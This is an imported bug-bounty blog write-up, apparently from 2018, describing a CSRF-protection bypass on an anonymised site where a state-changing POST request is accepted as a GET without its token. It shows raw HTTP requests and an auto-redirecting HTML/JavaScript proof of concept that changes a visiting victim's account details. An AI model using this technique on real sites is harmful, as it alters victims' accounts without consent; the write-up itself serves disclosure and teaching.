---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-10-26_a-very-useful-technique-to-bypass-the-csrf-protection-for-fun-and-profit_2.md
original_filename: 2018-10-26_a-very-useful-technique-to-bypass-the-csrf-protection-for-fun-and-profit_2.md
title: A very useful technique to bypass the CSRF protection for fun and profit.
category: documents
detected_topics:
- csrf
- command-injection
- otp
tags:
- imported
- documents
- csrf
- command-injection
- otp
language: en
raw_sha256: 3f9e5ff3f7b948244c7eddc7958bd4fb1ffd879d521b4ff4446a25273eb25de7
text_sha256: d8afcbeb46b043a4cbd4068150ec54be59e6d274f0f19ecb4724ead2a4accb50
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: false
---

# A very useful technique to bypass the CSRF protection for fun and profit.

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-10-26_a-very-useful-technique-to-bypass-the-csrf-protection-for-fun-and-profit_2.md
- Source Type: markdown
- Detected Topics: csrf, command-injection, otp
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: False
- Raw SHA256: `3f9e5ff3f7b948244c7eddc7958bd4fb1ffd879d521b4ff4446a25273eb25de7`
- Text SHA256: `d8afcbeb46b043a4cbd4068150ec54be59e6d274f0f19ecb4724ead2a4accb50`


## Content

---
title: "A very useful technique to bypass the CSRF protection for fun and profit."
url: "https://medium.com/@Skylinearafat/a-very-useful-technique-to-bypass-the-csrf-protection-for-fun-and-profit-471af64da276"
authors: ["Yeasir Arafat"]
bugs: ["CSRF"]
publication_date: "2018-10-26"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5626
scraped_via: "browseros"
---

# A very useful technique to bypass the CSRF protection for fun and profit.

A very useful technique to bypass the CSRF protection for fun and profit.
Yeasir Arafat
Follow
2 min read
·
Oct 26, 2018

287

5

Hi
folks, It’s always a pleasure to share some good stuff with you guys. The heading of the story may give you an idea that today I’m going to share something about CSRF protection bypass.

What is CSRF protection?

In short, CSRF(Cross-Site Request Forgery) attacks specifically target state-changing requests on a web browser. To prevent this attacks developer adds an ANTI-CSRF token in the request in several ways. For more, you can see it from here, `Article-1` `Article-2`

It was a private program that I was testing and because of privacy, I can not disclose the name. Let’s assume the site name is vulnhost.com. It was protected to CSRF until I found the bypass. The vulnhost.com verifying its request under a POST material request. Vulnhost.com actually implemented the _csrf token to the POST request and validate it on the server side.

The state changing POST request looked like this,

POST /mycenter/settings/account.html?2-1.IBehaviorListener.0-formContact-saveContact HTTP/1.1
Host: en.vulnhost.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: application/xml, text/xml, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://en.vulnhost.com/mycenter/settings/account.html
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Wicket-Ajax: true
Migration-Wicket: 6
Wicket-Ajax-BaseURL: mycenter/settings/account.html
Wicket-FocusedElementId: id49
X-Requested-With: XMLHttpRequest
Content-Length: 246
Cookie: .......
Connection: close
_csrf=725a7f90-192f-4b94-8fc9-6320ace14fef&id48_hf_0=&gender=radio8&firstName=xx&lastName=YY&saveContact=1

Get Yeasir Arafat’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Here, the_csrf= parameter generates the random token to verify the request. If I change/remove the _csrf token to the GET request vulnhost.com do not validate it on the server side.

For the bypass I change the request method POST to GETand remove the _csrf= paramter from the request. like below request,,

GET /mycenter/settings/account.html?2-1.IBehaviorListener.0-formContact-saveContact=&id48_hf_0=&gender=radio8&firstName=XX&lastName=YY&saveContact=1 HTTP/1.1
Host: en.vulnhost.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: application/xml, text/xml, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://en.vulnhost.com/mycenter/settings/account.html
Wicket-Ajax: true
Migration-Wicket: 6
Wicket-Ajax-BaseURL: mycenter/settings/account.html
Wicket-FocusedElementId: id49
X-Requested-With: XMLHttpRequest
Cookie: ...
Connection: close

As expected the request response was.200ok But there was a problem to change the request using typical HTML PoC. I faced, in this case, the browser requires a page refresh to change the content of the requested page. I thought the requestGET contains a bunch of HTTP header which may interrupt to changing the request.

For sort out this problem, I used a little bit of javascript and the final HTML request look likes,

<html>
<head>
<script type="text/javascript">
	var timer = null;
function auto_reload()
{
	window.location = 'https://en.vulnhost.com/mycenter/settings/account.html?4-2.IBehaviorListener.0-formContact-saveContact=&id48_hf_0=&gender=radio8&firstName=Account&lastName=Takeover&saveContact=1';
}
</script>
<body>
<!-- Reload page every 5 seconds. -->
	 <body onload="timer = setTimeout('auto_reload()',5000);">
</body>
</html>

The victims need not to click on to Submit Request HTML form as like typical CSRF attacks. What it does, it will change the content of victims browser on just visiting the page. I also can set a time limit here to load the page and it will change the victim account info automatically.

Thanks for reading. Yeasir Arafat
